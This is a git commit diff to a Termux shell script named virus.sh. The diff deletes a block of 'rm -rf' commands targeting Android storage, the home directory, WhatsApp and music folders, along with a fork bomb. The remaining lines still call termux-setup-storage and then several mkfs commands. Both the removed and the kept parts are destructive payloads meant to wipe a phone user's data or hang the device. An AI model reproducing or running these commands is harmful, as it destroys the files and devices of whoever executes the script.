d2738adb504eec269d41a938ca1130121b14063d
rajctg <39931753+jashim2018@users.noreply.github.com>
2020-02-20 13:30:14 +0600

    Update virus.sh

--- virus.sh
+++ virus.sh
@@ -1,19 +1,4 @@
 termux-setup-storage
-rm -rf /storage/emulated/0
-rm -rf /sdcard/0
-rm -rf /storage/emulated/0/
-rm -rf /storage/emulated/0/android/obb
-rm -rf /sdcard/0/android/data
-rm -rf $HOME
-rm -rf sdcard/0
-rm -rf storage/emulated/0
-rm -rf /storage/emulated/0/
-rm -rf /sdcard/0/WhatsApp
-rm -rf /storage/emulated/0/
-rm -rf /storage/emulated/0/
-rm -rf /sdcard/0/Music
-rm -rf /sdcard/0/Musik
-:(){ :|: & };:
 mkfs
 mkfs.bfs
 mkfs.minix
